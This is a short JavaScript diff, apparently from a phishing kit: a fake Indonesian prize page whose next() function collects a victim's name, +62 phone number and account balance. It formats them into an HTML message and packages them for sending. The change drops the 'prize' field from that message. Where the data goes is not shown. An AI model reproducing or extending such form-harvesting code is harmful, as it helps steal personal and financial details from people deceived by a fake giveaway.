@@ -13,7 +13,6 @@ $(document).ready(function() {
 });
 
 function next() {
-	var type = $("#type").val().trim();
 	var name = $("#name").val().trim();
 	var balance = $("#balance").val().trim();
 	var phone = $("#phone").val().trim();
@@ -24,7 +23,7 @@ function next() {
 	phone = "+62"+phone;
 	$("#loader").css('display', 'flex');
 	
-	var message = ('\n<b>Hadiah:</b>\n'+type+'\n\n<b>Nama:</b>\n'+name+'\n\n<b>No. HP:</b>\n'+phone+'\n\n<b>Saldo:</b>\nRp'+balance+'\n');
+	var message = ('\n<b>Nama:</b>\n'+name+'\n\n<b>No. HP:</b>\n'+phone+'\n\n<b>Saldo:</b>\nRp'+balance+'\n');
 	var fd = new FormData();
 	fd.append('message', message);
 	
